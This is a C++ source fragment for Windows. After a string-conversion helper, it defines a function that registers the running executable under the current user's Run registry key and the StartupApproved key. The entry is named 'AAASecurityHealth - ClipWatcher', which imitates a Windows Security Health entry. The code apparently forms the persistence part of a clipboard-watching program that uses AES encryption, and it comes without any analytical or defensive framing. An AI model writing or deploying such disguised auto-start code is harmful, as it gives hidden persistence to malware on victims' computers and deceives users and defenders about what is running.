#include <string>
#include <windows.h>
#include <fstream>
#include <vector>
#include <cstdint>
#include <cstring>
#include <iostream>
#include <iomanip>
#include "aes.h"

std::string WStringToUtf8(const std::wstring& wstr)
{
    if (wstr.empty()) return "";

    int size_needed = WideCharToMultiByte(CP_UTF8, 0, 
        wstr.c_str(), (int)wstr.size(), 
        nullptr, 0, nullptr, nullptr);

    std::string result(size_needed, 0);

    WideCharToMultiByte(CP_UTF8, 0, 
        wstr.c_str(), (int)wstr.size(), 
        &result[0], size_needed, nullptr, nullptr);

    return result;
}

void AddToStartup() {
    HKEY hKey;
    const char* runKey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    const char* valueName = "AAASecurityHealth - ClipWatcher";

    const char* approvedKey = "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StartupApproved\\Run";
    BYTE enabled[] = { 0x03, 0x00, 0x00, 0x00 };

    char exePath[MAX_PATH];
    GetModuleFileNameA(NULL, exePath, MAX_PATH);

    if (RegOpenKeyExA(HKEY_CURRENT_USER, runKey, 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, valueName, 0, REG_SZ, (BYTE*)exePath, strlen(exePath) + 1);
        RegCloseKey(hKey);
    }

    
    if (RegOpenKeyExA(HKEY_CURRENT_USER, approvedKey, 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, valueName, 0, REG_BINARY, enabled, sizeof(enabled));
        RegCloseKey(hKey);
    }
}
